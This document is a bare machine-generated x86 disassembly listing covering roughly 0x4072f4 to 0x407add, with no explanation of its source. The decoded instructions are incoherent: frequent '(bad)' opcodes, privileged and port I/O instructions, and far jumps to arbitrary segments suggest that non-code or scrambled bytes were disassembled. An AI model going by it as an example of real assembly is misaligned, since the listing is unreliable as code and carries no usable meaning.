  4072f4:	popa   
  4072f5:	les    ecx,FWORD PTR [esi+esi*2-0x17]
  4072f9:	sub    DWORD PTR [esi],0xffffffaa
  4072fc:	arpl   WORD PTR cs:[esi],bp
  4072ff:	ret    
  407300:	inc    esp
  407301:	arpl   WORD PTR ds:[ecx+0x0],bp
  407305:	out    dx,al
  407306:	sbb    BYTE PTR gs:[edi+0x3],0xdb
  40730b:	rcl    BYTE PTR [ecx-0x59],0x99
  40730f:	ss pop eax
  407311:	arpl   WORD PTR [ebx-0x51],sp
  407314:	mov    BYTE PTR [edi+0x7a],dl
  407317:	lock ret 
  407319:	out    dx,eax
  40731a:	call   0x68bd:0xd901c24
  407321:	cmc    
  407322:	fldcw  WORD PTR [ecx]
  407324:	jle    0x4072db
  407326:	adc    esi,edx
  407328:	mov    eax,0xc1f4d53
  40732d:	lea    edi,[edi+0x4c]
  407330:	mov    edx,0x5fa60ec6
  407335:	cmp    bh,0xdc
  407338:	cmc    
  407339:	mov    edi,0xad6e4fcf
  40733e:	loop   0x407307
  407340:	sahf   
  407341:	stos   BYTE PTR es:[edi],al
  407342:	adc    DWORD PTR [edi-0xbfcd293],edi
  407348:	jb     0x407327
  40734a:	scas   al,BYTE PTR es:[edi]
  40734b:	lods   eax,DWORD PTR ds:[esi]
  40734c:	cmp    eax,0x2806721f
  407351:	mov    ah,0x46
  407353:	pop    ss
  407354:	adc    ecx,DWORD PTR [esi]
  407356:	lock inc eax
  407358:	adc    eax,0x8ca0b1f1
  40735d:	pcmpeqd mm4,mm2
  407360:	bound  esi,QWORD PTR [ecx+0x66]
  407363:	sbb    esi,esi
  407365:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407366:	(bad)
  407369:	stc    
  40736a:	push   ss
  40736b:	push   ss
  40736c:	sub    BYTE PTR [ecx+0x2],dh
  40736f:	pop    esi
  407370:	adc    edi,esi
  407372:	mov    esi,0x1b9d0de0
  407377:	mov    ebp,0x56ced216
  40737c:	dec    ebp
  40737d:	inc    edx
  40737e:	iret   
  40737f:	pop    ebx
  407380:	retf   
  407381:	lock or esp,esi
  407384:	ror    dl,0xee
  407387:	ss mov ebx,0x67a7178d
  40738d:	lds    edx,FWORD PTR [esi]
  40738f:	fwait
  407390:	inc    esp
  407391:	adc    DWORD PTR [edx-0x5f],edi
  407394:	mov    WORD PTR [ebx+0x11ab91b2],?
  40739a:	call   0xd6479ef6
  40739f:	or     BYTE PTR [esi+ebx*4+0x42ef60c6],ch
  4073a6:	int3   
  4073a7:	pop    edi
  4073a8:	pop    edi
  4073a9:	xor    eax,0x926e3c2
  4073ae:	in     eax,0xc5
  4073b0:	popa   
  4073b1:	and    esp,DWORD PTR [edx+ebp*4-0x39]
  4073b5:	(bad)  
  4073b7:	dec    esp
  4073b8:	or     ch,BYTE PTR ds:0x1ae8c8e
  4073be:	pop    esi
  4073bf:	xchg   edx,eax
  4073c0:	mov    eax,ds:0x48e105af
  4073c5:	inc    esi
  4073c6:	retf   
  4073c7:	xchg   BYTE PTR [esi+0x2b03acf1],dh
  4073cd:	(bad)  
  4073ce:	fmul   st,st(7)
  4073d0:	or     al,0x7f
  4073d2:	mov    eax,ds:0x19456c4f
  4073d7:	xchg   esi,eax
  4073d8:	and    DWORD PTR [edx+eax*2-0x7d],ecx
  4073dc:	(bad)  
  4073de:	jg     0x4073eb
  4073e0:	or     eax,0xc07d8c45
  4073e5:	mov    ebp,DWORD PTR [ebx-0x75cd9976]
  4073eb:	fdivr  DWORD PTR [eax+0x6f9d3b54]
  4073f1:	data16 cs fwait
  4073f4:	xchg   esi,eax
  4073f5:	pop    esi
  4073f6:	shr    DWORD PTR [edi],cl
  4073f8:	nop
  4073f9:	dec    ebx
  4073fa:	jno    0x40742a
  4073fc:	icebp  
  4073fd:	mov    DWORD PTR cs:[edi],esp
  407400:	aad    0x7d
  407402:	scas   eax,DWORD PTR es:[edi]
  407403:	and    bh,BYTE PTR [ebx+0x63c9dcf3]
  407409:	pusha  
  40740a:	sbb    DWORD PTR [ecx-0x28],esp
  40740d:	test   al,0xb2
  40740f:	and    DWORD PTR [ebx+0x79],ecx
  407412:	xchg   esp,eax
  407413:	mov    al,0x8d
  407415:	ret    0x10a5
  407418:	push   ecx
  407419:	(bad)  
  40741a:	cmp    eax,0x71054795
  40741f:	shl    ebp,cl
  407421:	(bad)  
  407422:	jle    0x4073ea
  407424:	ss sar ch,cl
  407427:	stos   BYTE PTR es:[edi],al
  407428:	mov    edx,0x3ac54ca8
  40742d:	(bad)  
  40742e:	ret    0x2a32
  407431:	xchg   edx,eax
  407432:	dec    ecx
  407433:	jb     0x40745f
  407435:	xlat   BYTE PTR ds:[ebx]
  407436:	pop    edx
  407437:	or     esi,DWORD PTR [ebx+0x2d]
  40743a:	xchg   DWORD PTR [edi],ebx
  40743c:	pop    eax
  40743d:	aam    0x6c
  40743f:	jno    0x40740d
  407441:	push   edx
  407442:	rcl    BYTE PTR [ebp+0x7a],1
  407445:	adc    cl,BYTE PTR [ecx-0x7c81e91b]
  40744b:	in     al,0xe
  40744d:	frstor [edi-0x4451e40d]
  407453:	push   ecx
  407454:	push   es
  407455:	and    esp,esi
  407457:	push   ss
  407458:	shl    DWORD PTR [ecx+eax*1-0x74],cl
  40745c:	dec    eax
  40745d:	jecxz  0x407492
  40745f:	sub    BYTE PTR [ebx+edi*8],dl
  407462:	mov    ah,0x2a
  407464:	int    0x35
  407466:	and    eax,0xb1901d7
  40746b:	sub    dl,bl
  40746d:	xchg   edi,eax
  40746e:	push   ebx
  40746f:	mov    bh,BYTE PTR [ecx-0x4d]
  407472:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407473:	cmp    bh,cl
  407475:	pop    ebp
  407476:	adc    eax,0xa12e0a4c
  40747b:	mov    eax,0x966a8609
  407480:	(bad)  
  407482:	test   DWORD PTR [ecx],edx
  407484:	push   ebp
  407485:	mov    al,0x2b
  407487:	xchg   edx,eax
  407488:	and    al,0xd7
  40748a:	into   
  40748b:	stos   BYTE PTR es:[edi],al
  40748c:	or     esi,edi
  40748e:	mov    cl,bh
  407490:	and    BYTE PTR ds:0xcccec917,dh
  407496:	sub    dh,BYTE PTR [ebp-0xa66a16b]
  40749c:	loop   0x407511
  40749e:	cmp    al,BYTE PTR [ecx]
  4074a0:	and    eax,DWORD PTR [esi+ebx*2]
  4074a3:	add    dh,BYTE PTR [eax-0x2be2b14d]
  4074a9:	push   ss
  4074aa:	xchg   BYTE PTR [esi-0x30],cl
  4074ad:	jnp    0x407443
  4074af:	rol    BYTE PTR [eax-0x1d66d71b],cl
  4074b5:	mov    ds:0x6d632da3,al
  4074ba:	sbb    al,0x7e
  4074bc:	(bad)  
  4074bd:	(bad)  
  4074be:	fld    TBYTE PTR [esp+ecx*8-0x58e5084d]
  4074c5:	mov    al,0x60
  4074c7:	stos   BYTE PTR es:[edi],al
  4074c8:	and    al,0xf0
  4074ca:	hlt    
  4074cb:	loope  0x4074d9
  4074cd:	rol    BYTE PTR [edi],1
  4074cf:	mov    al,0x17
  4074d1:	push   ebx
  4074d2:	or     edi,DWORD PTR [edx-0x1aa3b6a]
  4074d8:	jno    0x407464
  4074da:	jle    0x40746d
  4074dc:	call   0x9b57:0xed45005b
  4074e3:	shr    BYTE PTR [ecx],0x8f
  4074e6:	popf   
  4074e7:	and    DWORD PTR [edx],eax
  4074e9:	icebp  
  4074ea:	inc    edx
  4074eb:	inc    ecx
  4074ec:	imul   edi,DWORD PTR [esi+0x565df044],0x76
  4074f3:	xchg   edi,eax
  4074f4:	mov    dh,0xf9
  4074f6:	add    DWORD PTR [eax],ebp
  4074f8:	std    
  4074f9:	fcmovnbe st,st(5)
  4074fb:	mov    ch,0x76
  4074fd:	mov    DWORD PTR [ecx+ebx*2+0x6b417ca4],esi
  407504:	push   0x1c
  407506:	adc    BYTE PTR [ecx],0xc7
  407509:	outs   dx,DWORD PTR ds:[esi]
  40750a:	jmp    0x9b95004a
  40750f:	cdq    
  407510:	sti    
  407511:	jae    0x4074f1
  407513:	and    eax,0x1c688b60
  407518:	jnp    0x40753b
  40751a:	push   ds
  40751b:	pop    eax
  40751c:	mov    edx,DWORD PTR [ebx-0x73cf8536]
  407522:	push   ebx
  407523:	outs   dx,DWORD PTR ds:[esi]
  407524:	pop    esi
  407525:	aam    0xd
  407527:	test   DWORD PTR [eax-0x949afcd],ecx
  40752d:	outs   dx,DWORD PTR ds:[esi]
  40752e:	repz leave 
  407530:	push   cs
  407531:	and    eax,0x16ee1f49
  407536:	scas   al,BYTE PTR es:[edi]
  407537:	imul   esp,DWORD PTR [edi-0x17],0x42
  40753b:	sub    ecx,DWORD PTR [eax]
  40753d:	inc    ecx
  40753e:	loop   0x4074d6
  407540:	mov    ebp,eax
  407542:	sbb    BYTE PTR [ebp+0x201c3c55],al
  407548:	shufps xmm4,XMMWORD PTR [esp+edx*8-0x36d9c216],0x3c
  407551:	add    ebx,DWORD PTR [edi+0x31ab44d0]
  407557:	imul   BYTE PTR [ebp-0x638d8695]
  40755d:	pop    es
  40755e:	bound  ecx,QWORD PTR [ebp+0x4b]
  407561:	(bad)  
  407562:	out    0x11,eax
  407564:	mov    ah,BYTE PTR es:[esi+0x4]
  407568:	pop    ecx
  407569:	mov    ch,0xe
  40756b:	sub    eax,0x3ee056b6
  407570:	aad    0x36
  407572:	mov    bh,0xdf
  407574:	out    dx,eax
  407575:	shl    edx,cl
  407577:	rcr    BYTE PTR [edi],0x8e
  40757a:	sbb    ah,BYTE PTR [esi-0x57]
  40757d:	les    ebp,FWORD PTR [esi*1-0x16b43def]
  407584:	outs   dx,BYTE PTR ds:[esi]
  407585:	and    cl,dh
  407587:	push   esp
  407588:	cmc    
  407589:	sub    DWORD PTR [edi+0x5c679f99],esp
  40758f:	mov    esi,0xe54ecec3
  407594:	and    esp,DWORD PTR [esi]
  407596:	pop    edi
  407597:	fs std 
  407599:	dec    eax
  40759a:	push   ebx
  40759b:	cmp    al,0x2b
  40759d:	jle    0x407543
  40759f:	hlt    
  4075a0:	pop    ss
  4075a1:	pop    eax
  4075a2:	repz and bl,ch
  4075a5:	aad    0x7d
  4075a7:	jnp    0x407607
  4075a9:	inc    ecx
  4075aa:	push   eax
  4075ab:	or     BYTE PTR [ecx],dl
  4075ad:	ja     0x407600
  4075af:	out    dx,al
  4075b0:	mov    edi,0x2578180
  4075b5:	add    DWORD PTR [ebx+0x62e83df0],ebx
  4075bb:	or     DWORD PTR [ecx-0xc879f05],0x4b
  4075c2:	jle    0x407612
  4075c4:	outs   dx,DWORD PTR ds:[esi]
  4075c5:	enter  0x141c,0xa2
  4075c9:	push   ecx
  4075ca:	sbb    al,0x35
  4075cc:	xchg   edi,eax
  4075cd:	add    cl,BYTE PTR [edi]
  4075cf:	fcomp  DWORD PTR [eax-0x2e]
  4075d2:	mov    cl,0x6f
  4075d4:	inc    eax
  4075d5:	or     ax,0x64ae
  4075d9:	lods   al,BYTE PTR ds:[esi]
  4075da:	mov    cl,0xd2
  4075dc:	loop   0x407594
  4075de:	mov    edi,0x206aecca
  4075e3:	ins    DWORD PTR es:[edi],dx
  4075e4:	jge    0x40757d
  4075e6:	mov    cl,0x19
  4075e8:	and    esi,DWORD PTR ss:[ebp+0x3d]
  4075ec:	shl    BYTE PTR [ecx-0x7b],1
  4075ef:	into   
  4075f0:	sti    
  4075f1:	push   es
  4075f2:	fs cdq 
  4075f4:	dec    ecx
  4075f5:	inc    edx
  4075f6:	adc    edi,esi
  4075f8:	push   ds
  4075f9:	es push cs
  4075fb:	icebp  
  4075fc:	nop
  4075fd:	(bad)  [eax-0x1f]
  407600:	mov    al,0xbd
  407602:	or     dl,dl
  407604:	jge    0x4075f0
  407606:	frndint 
  407608:	add    al,0x30
  40760a:	cs gs jne 0x40766a
  40760e:	cdq    
  40760f:	mov    DWORD PTR [ebx-0x4e],ebx
  407612:	xchg   ecx,eax
  407613:	jae    0x407627
  407615:	test   BYTE PTR [eax+0x1e0c44d9],ah
  40761b:	mov    ch,0x97
  40761d:	sbb    cl,BYTE PTR ds:0xd572d4ca
  407623:	out    dx,eax
  407624:	mov    ds:0xf95046c2,eax
  407629:	adc    BYTE PTR [eax],bl
  40762b:	mov    bh,0x91
  40762d:	mov    bl,0x1e
  40762f:	dec    eax
  407630:	les    esp,FWORD PTR [edx+edx*8-0x68]
  407634:	mov    al,0xd2
  407636:	xchg   edi,eax
  407637:	inc    ebx
  407638:	and    eax,DWORD PTR [edi]
  40763a:	jnp    0x40762f
  40763c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40763d:	int3   
  40763e:	lock adc al,0x20
  407641:	push   esi
  407642:	call   0x4afc:0x862dad66
  407649:	aad    0xed
  40764b:	pop    ss
  40764c:	cmp    ch,BYTE PTR [ebx+ebp*2-0x75]
  407650:	arpl   WORD PTR [edi],sp
  407652:	mov    ah,0x37
  407654:	sub    ch,dl
  407656:	cmc    
  407657:	hlt    
  407658:	dec    edi
  407659:	jo     0x4076d3
  40765b:	jp     0x407675
  40765d:	cdq    
  40765e:	fwait
  40765f:	xor    ecx,edi
  407661:	inc    ebx
  407662:	rcl    BYTE PTR ds:0xb47254ec,cl
  407668:	sar    DWORD PTR [edi],0xcb
  40766b:	js     0x407652
  40766d:	sbb    ch,BYTE PTR [esi-0x359350e4]
  407673:	inc    ebp
  407674:	pop    eax
  407675:	cmp    edi,ebx
  407677:	sti    
  407678:	scas   al,BYTE PTR es:[edi]
  407679:	into   
  40767a:	or     dh,BYTE PTR [eax+esi*4]
  40767d:	call   FWORD PTR [edi]
  40767f:	cmp    eax,0xf8fe529b
  407684:	test   DWORD PTR [ecx+0x57],eax
  407687:	mov    esp,0xbe6020ae
  40768c:	js     0x4076f6
  40768e:	ret    0x3426
  407691:	mov    ebp,0x302282d0
  407696:	xor    bh,BYTE PTR [esi]
  407698:	dec    esi
  407699:	shl    BYTE PTR [ecx-0x52],cl
  40769c:	inc    edx
  40769d:	cmc    
  40769e:	mov    esp,0x645c9fcd
  4076a3:	pop    edi
  4076a4:	dec    ebx
  4076a5:	or     eax,0x25f5e882
  4076aa:	adc    al,ch
  4076ac:	sub    DWORD PTR [ecx],edx
  4076ae:	retf   
  4076af:	push   0xfffffffc
  4076b1:	inc    ebx
  4076b2:	push   cs
  4076b3:	cmp    esp,DWORD PTR [edi+0x2437ac9c]
  4076b9:	adc    cl,BYTE PTR ds:0x6b0ba523
  4076bf:	ss rol ebx,0x1d
  4076c3:	jmp    0x829a:0x8f01e728
  4076ca:	dec    ebp
  4076cb:	sub    al,0xcc
  4076cd:	out    0xea,eax
  4076cf:	imul   ebx,DWORD PTR [eax],0xffffffea
  4076d2:	hlt    
  4076d3:	cmp    eax,0x71d9523e
  4076d8:	ret    
  4076d9:	aam    0xa6
  4076db:	enter  0x4e94,0x83
  4076df:	pop    ebp
  4076e0:	mov    cl,0xaf
  4076e2:	xchg   edx,eax
  4076e3:	bound  esp,QWORD PTR [ecx]
  4076e5:	aad    0x37
  4076e7:	aaa    
  4076e8:	jnp    0x4076b3
  4076ea:	les    eax,FWORD PTR [eax-0x64a8ab65]
  4076f0:	mov    eax,edx
  4076f2:	mov    ch,0xad
  4076f4:	adc    al,0x6b
  4076f6:	mov    ds:0x3838e1d2,al
  4076fb:	aam    0x50
  4076fd:	ins    BYTE PTR es:[edi],dx
  4076fe:	sahf   
  4076ff:	adc    ebp,DWORD PTR [edx+0x43175c92]
  407705:	adc    eax,0x139d3b0c
  40770a:	sub    eax,0x1f21c8b1
  40770f:	(bad)  
  407710:	gs icebp 
  407712:	cmp    eax,0x1e2c9e1d
  407717:	mov    edx,0xf9761b17
  40771c:	lods   al,BYTE PTR ds:[esi]
  40771d:	imul   ebp,DWORD PTR [eax-0x3f4c79e9],0x74b8ad87
  407727:	pop    esi
  407728:	outs   dx,BYTE PTR ds:[esi]
  407729:	jle    0x40772e
  40772b:	inc    esi
  40772c:	cli    
  40772d:	add    al,ch
  40772f:	adc    eax,0xf3eb53ab
  407734:	push   ebx
  407735:	adc    dl,BYTE PTR [eax]
  407737:	push   edi
  407738:	outs   dx,BYTE PTR ds:[esi]
  407739:	mov    bh,0x2d
  40773b:	jne    0x407717
  40773d:	sbb    DWORD PTR [eax-0x5b],ebp
  407740:	aas    
  407741:	mov    al,0x9b
  407743:	push   ecx
  407744:	cld    
  407745:	pop    es
  407746:	mov    WORD PTR ds:0xe1cbae59,gs
  40774c:	and    esp,DWORD PTR [eax+0x7c]
  40774f:	jl     0x4076e4
  407751:	sar    eax,cl
  407753:	es jl  0x40774e
  407756:	imul   ebp,DWORD PTR [edx],0xc8b848a0
  40775c:	loopne 0x407780
  40775e:	test   BYTE PTR [ecx],bl
  407760:	or     eax,0xce0f96c4
  407765:	sbb    esi,0x52093be5
  40776b:	nop
  40776c:	js     0x407729
  40776e:	mov    ds,esi
  407770:	aas    
  407771:	nop
  407772:	jge    0x4077ef
  407774:	outs   dx,BYTE PTR ds:[esi]
  407775:	adc    cl,BYTE PTR [ebp-0x25]
  407778:	in     al,dx
  407779:	shr    BYTE PTR [edx-0x17],1
  40777c:	cmp    dl,dl
  40777e:	test   eax,0x5b2119f8
  407783:	sahf   
  407784:	mov    dl,0xac
  407786:	mov    cr0,edi
  407789:	mov    dh,0x85
  40778b:	je     0x40775d
  40778d:	(bad)  
  40778e:	cmc    
  40778f:	inc    eax
  407790:	push   ecx
  407791:	xchg   ebp,eax
  407792:	push   es
  407793:	xor    al,0xec
  407795:	push   edi
  407796:	xor    dh,BYTE PTR [ecx]
  407798:	cmp    ecx,0x26
  40779b:	mov    ebx,0x262cacf4
  4077a0:	sti    
  4077a1:	call   FWORD PTR [ebx+0x4853082a]
  4077a7:	and    eax,0x57ef7750
  4077ac:	mov    esi,0xf0b55adc
  4077b1:	jl     0x40781f
  4077b3:	inc    ecx
  4077b4:	mov    ss,WORD PTR [edx]
  4077b6:	fsubr  st,st(1)
  4077b8:	jbe    0x407751
  4077ba:	aad    0x7d
  4077bc:	in     eax,dx
  4077bd:	cmc    
  4077be:	inc    edi
  4077bf:	dec    ecx
  4077c0:	mov    BYTE PTR ss:[ebp+0x7622f380],ah
  4077c7:	ror    DWORD PTR [esi+0x44147cb5],cl
  4077cd:	test   al,0x88
  4077cf:	push   eax
  4077d0:	mov    ebx,0x8b61716d
  4077d5:	push   esp
  4077d6:	scas   eax,DWORD PTR es:[edi]
  4077d7:	popf   
  4077d8:	bound  esp,QWORD PTR cs:[ecx-0x32b7090]
  4077df:	sbb    esi,eax
  4077e1:	cdq    
  4077e2:	sbb    ebp,ebx
  4077e4:	dec    eax
  4077e5:	dec    edi
  4077e6:	inc    eax
  4077e7:	cmp    eax,0x6c090d25
  4077ec:	sub    BYTE PTR [edi+ebx*1+0x66],dh
  4077f0:	shl    DWORD PTR [edx],1
  4077f2:	ds js  0x407862
  4077f5:	push   ebx
  4077f6:	addr16 jo 0x4077c7
  4077f9:	adc    DWORD PTR [ebp-0x2c],ecx
  4077fc:	in     al,dx
  4077fd:	sbb    BYTE PTR [ecx+0x48],ch
  407800:	mov    al,0x39
  407802:	mov    esi,0x7c03887f
  407807:	sub    DWORD PTR [ebx],0xffffff9f
  40780a:	call   0x6b7b:0x6e9ad644
  407811:	push   ds
  407812:	mov    esi,0x5f3ee8c
  407817:	or     al,0x7e
  407819:	mov    BYTE PTR ds:0xd4c546b6,bh
  40781f:	stos   DWORD PTR es:[edi],eax
  407820:	mov    ah,0xc0
  407822:	mov    edx,0xfb2fdc3
  407827:	mov    eax,ds:0x823df50c
  40782c:	loope  0x40788a
  40782e:	ins    BYTE PTR es:[edi],dx
  40782f:	push   edi
  407830:	mov    eax,0x72a63afe
  407835:	and    al,BYTE PTR [eax+ecx*8-0x5e]
  407839:	fnstcw WORD PTR [edi*1-0x6627dd41]
  407840:	cmp    eax,0x66ae94da
  407845:	or     edi,edi
  407847:	jno    0x40787b
  407849:	cwde   
  40784a:	lods   al,BYTE PTR ds:[esi]
  40784b:	push   edx
  40784c:	(bad)  
  40784d:	std    
  40784e:	repz pop ebx
  407850:	xchg   edi,eax
  407851:	outs   dx,DWORD PTR ds:[esi]
  407852:	xor    ebx,DWORD PTR [edi]
  407854:	xchg   esp,eax
  407855:	in     eax,dx
  407856:	xchg   BYTE PTR [ebx],al
  407858:	cwde   
  407859:	or     cl,cl
  40785b:	enter  0x1092,0x5b
  40785f:	sub    DWORD PTR [esi],0x6c0e777c
  407865:	inc    esp
  407866:	imul   edi,DWORD PTR [ecx+eax*8],0x1b
  40786a:	xchg   ebx,ecx
  40786c:	sar    BYTE PTR [esi+0x6f],1
  40786f:	ror    DWORD PTR ds:0x3a9a,cl
  407874:	call   0x98eb:0x8434d94d
  40787b:	cmp    bh,BYTE PTR [ecx-0x151fe016]
  407881:	and    al,0xa
  407883:	inc    esi
  407884:	cwde   
  407885:	cmp    al,dl
  407887:	jae    0x407855
  407889:	or     al,0xb6
  40788b:	mov    eax,0x5be31e3f
  407890:	add    esi,DWORD PTR [edi+0x27]
  407893:	jg     0x4078ce
  407895:	inc    ebx
  407896:	pop    ds
  407897:	mov    ebx,0x8d9bc773
  40789c:	scas   eax,DWORD PTR es:[edi]
  40789d:	pop    esp
  40789e:	out    0x44,al
  4078a0:	jg     0x40782a
  4078a2:	pop    edx
  4078a3:	repz sbb eax,DWORD PTR [eax-0x34]
  4078a7:	inc    esi
  4078a8:	outs   dx,DWORD PTR ds:[esi]
  4078a9:	mov    edi,0x835a2169
  4078ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4078af:	cld    
  4078b0:	adc    DWORD PTR [ecx],0x2e
  4078b3:	fisub  DWORD PTR [edi+ecx*4-0x315639cd]
  4078ba:	jp     0x4078e5
  4078bc:	std    
  4078bd:	call   0xf4ee:0xbc44309d
  4078c4:	repnz dec ebp
  4078c6:	jnp    0x40787d
  4078c8:	scas   al,BYTE PTR es:[edi]
  4078c9:	scas   al,BYTE PTR es:[edi]
  4078ca:	push   eax
  4078cb:	das    
  4078cc:	dec    ebp
  4078cd:	mov    eax,0xa35bbcb
  4078d2:	daa    
  4078d3:	enter  0x407c,0x1f
  4078d7:	jns    0x407955
  4078d9:	imul   edx,DWORD PTR [edx+0x43],0xffffffee
  4078dd:	int3   
  4078de:	pop    eax
  4078df:	rcl    DWORD PTR [ebp-0x5818dfa0],0xe0
  4078e6:	stc    
  4078e7:	push   edx
  4078e8:	retf   
  4078e9:	ss aam 0xad
  4078ec:	(bad)  
  4078ed:	out    0x14,eax
  4078ef:	daa    
  4078f0:	jge    0x4078e9
  4078f2:	shr    DWORD PTR ds:0x4760757e,1
  4078f8:	fimul  DWORD PTR [ebx+0x2d]
  4078fb:	arpl   bx,bx
  4078fd:	inc    esp
  4078fe:	add    bh,BYTE PTR [esp+ecx*8+0x3a]
  407902:	adc    DWORD PTR [edx+esi*2+0x23ecc48],0xffffff80
  40790a:	or     BYTE PTR [esi+edx*1+0x51],0x61
  40790f:	test   al,0x1b
  407911:	mov    DWORD PTR [edi-0x5a5f8984],ebp
  407917:	dec    edx
  407918:	xor    al,0x68
  40791a:	data16 stos BYTE PTR es:[edi],al
  40791c:	pop    ss
  40791d:	pop    eax
  40791e:	rcl    BYTE PTR ds:0x59a2e508,0x6e
  407925:	and    al,0x3c
  407927:	lods   al,BYTE PTR ds:[esi]
  407928:	sub    eax,0xf4cc57ff
  40792d:	dec    ecx
  40792e:	push   esi
  40792f:	out    dx,eax
  407930:	cld    
  407931:	add    eax,0xff78c9fa
  407936:	ja     0x407946
  407938:	test   BYTE PTR [eax-0x508a1ac5],bh
  40793e:	jg     0x40795a
  407940:	xor    eax,0xdba24310
  407945:	mov    edx,0x2ec97b77
  40794a:	or     cl,cl
  40794c:	push   ebx
  40794d:	add    esi,ebx
  40794f:	jb     0x4078e3
  407951:	push   esp
  407952:	add    DWORD PTR [ebx-0x2c],edi
  407955:	xor    ah,ah
  407957:	jmp    0x56a4:0x1baf390a
  40795e:	pop    ebx
  40795f:	(bad)  
  407960:	arpl   WORD PTR [eax-0x26],bp
  407963:	or     al,0xc5
  407965:	and    al,dh
  407967:	add    BYTE PTR [esi+esi*1-0x29d77e2a],dl
  40796e:	xor    esp,ecx
  407970:	test   eax,0x8bed894d
  407975:	nop
  407976:	sub    BYTE PTR [ebx+esi*1],dh
  407979:	rcl    DWORD PTR [ecx-0x3f],cl
  40797c:	adc    ch,0x33
  40797f:	fisttp WORD PTR [edi-0x50]
  407982:	daa    
  407983:	inc    eax
  407984:	ins    BYTE PTR es:[edi],dx
  407985:	daa    
  407986:	cdq    
  407987:	mov    BYTE PTR [edi],al
  407989:	or     al,0xa2
  40798b:	sbb    DWORD PTR [edx],ebp
  40798d:	nop
  40798e:	mov    DWORD PTR [edi+0x5de64a52],edi
  407994:	mov    DWORD PTR [esi-0x7d],esp
  407997:	into   
  407998:	and    ecx,DWORD PTR [esi-0x4dfdf98c]
  40799e:	imul   edx,DWORD PTR [edx-0x7224ecff],0xffffff94
  4079a5:	mul    edx
  4079a7:	mov    bh,0x90
  4079a9:	or     DWORD PTR [ebx+0x7d],0xa7308787
  4079b0:	rcl    DWORD PTR [eax-0x6],cl
  4079b3:	push   ds
  4079b4:	je     0x40796f
  4079b6:	sub    esi,DWORD PTR [esi+0x6def8a84]
  4079bc:	ins    DWORD PTR es:[edi],dx
  4079bd:	pop    ecx
  4079be:	pop    ebp
  4079bf:	cmp    BYTE PTR [edx+0x3e],dh
  4079c2:	sbb    eax,0xbb8efe86
  4079c7:	loopne 0x407984
  4079c9:	(bad)  
  4079ca:	dec    esi
  4079cb:	pop    es
  4079cc:	(bad)  
  4079cd:	out    0x72,al
  4079cf:	jge    0x4079b8
  4079d1:	jmp    0x40799f
  4079d3:	push   ds
  4079d4:	and    al,0xb9
  4079d6:	mov    dh,0xcc
  4079d8:	inc    esp
  4079d9:	add    DWORD PTR [edi+ecx*1+0x629e8600],eax
  4079e0:	jmp    0xa76337a3
  4079e5:	fiadd  DWORD PTR [ebx]
  4079e7:	sbb    eax,edi
  4079e9:	dec    ebp
  4079ea:	int3   
  4079eb:	push   esi
  4079ec:	jecxz  0x407a61
  4079ee:	dec    ebp
  4079ef:	sub    cl,BYTE PTR [ecx-0x25598b66]
  4079f5:	inc    esp
  4079f6:	ret    0x93ea
  4079f9:	cdq    
  4079fa:	add    eax,edi
  4079fc:	dec    esi
  4079fd:	xor    BYTE PTR [eax+0x66],dh
  407a00:	dec    ecx
  407a01:	outs   dx,BYTE PTR ds:[esi]
  407a02:	imul   esi,DWORD PTR [edi-0x1b],0x4f
  407a06:	repnz add BYTE PTR [esi+edi*2-0x57],bh
  407a0b:	in     eax,dx
  407a0c:	je     0x407a5e
  407a0e:	scas   eax,DWORD PTR es:[edi]
  407a0f:	fwait
  407a10:	pop    esi
  407a11:	sbb    eax,0xe41116da
  407a16:	pop    es
  407a17:	mov    bh,0x46
  407a19:	push   0xd23fadb4
  407a1e:	div    DWORD PTR [eax]
  407a20:	es mov edx,ecx
  407a23:	mov    ch,0xe8
  407a25:	repz inc edi
  407a27:	inc    ebp
  407a28:	cdq    
  407a29:	scas   eax,DWORD PTR es:[edi]
  407a2a:	and    cl,ch
  407a2c:	daa    
  407a2d:	sbb    cl,BYTE PTR [edx-0x3b]
  407a30:	call   0x21ad:0x3b5058
  407a37:	retf   0xd881
  407a3a:	mov    DWORD PTR [ebx+0x5e885325],edx
  407a40:	cmp    al,0x1b
  407a42:	push   ebp
  407a43:	xor    al,0x12
  407a45:	dec    esp
  407a46:	push   esp
  407a47:	repnz or al,0x2e
  407a4a:	je     0x4079f9
  407a4c:	out    dx,al
  407a4d:	pop    edx
  407a4e:	pop    ebx
  407a4f:	push   edi
  407a50:	inc    ecx
  407a51:	mov    al,ds:0x380a062f
  407a56:	stos   DWORD PTR es:[edi],eax
  407a57:	mov    dh,0xd1
  407a59:	idiv   BYTE PTR [esi-0x1f]
  407a5c:	lock mov ch,0x88
  407a5f:	push   ecx
  407a60:	xor    al,0x72
  407a62:	loopne 0x4079fd
  407a64:	mov    al,ds:0x49b6a2f8
  407a69:	enter  0x9f04,0x87
  407a6d:	lock (bad) 
  407a6f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407a70:	jmp    0x61a2:0xe4d25533
  407a77:	mov    ds:0xe894eeb,al
  407a7c:	retf   0xfe8b
  407a7f:	neg    edx
  407a81:	adc    BYTE PTR [ecx-0x7203e18c],bh
  407a87:	push   cs
  407a88:	pop    ss
  407a89:	sti    
  407a8a:	dec    eax
  407a8b:	ss stos DWORD PTR es:[edi],eax
  407a8d:	pushf  
  407a8e:	enter  0x9af5,0xf2
  407a92:	adc    DWORD PTR [eax-0x3b],ebx
  407a95:	push   0xffffffc1
  407a97:	mov    cl,BYTE PTR [esi]
  407a99:	mov    BYTE PTR ss:[ecx-0x39],dh
  407a9d:	scas   eax,DWORD PTR es:[edi]
  407a9e:	mov    edi,0xf8c6eb29
  407aa3:	dec    edx
  407aa4:	mov    ecx,0x7c3d446f
  407aa9:	popa   
  407aaa:	fstp   QWORD PTR [edx-0x2f812828]
  407ab0:	jg     0x407aae
  407ab2:	xchg   BYTE PTR ds:0xab1a1529,bl
  407ab8:	sbb    eax,0xc0288a9d
  407abd:	arpl   WORD PTR [edi+0x30f87d30],di
  407ac3:	xor    eax,esp
  407ac5:	loopne 0x407ab2
  407ac7:	imul   esi,DWORD PTR [eax-0x37],0xfffffff1
  407acb:	in     al,dx
  407acc:	cmp    al,0xfd
  407ace:	in     eax,0x32
  407ad0:	jnp    0x407aa3
  407ad2:	or     DWORD PTR [ebx+0x3f621676],esi
  407ad8:	mov    edx,0x13917ad
  407add:	je     0x407b1d
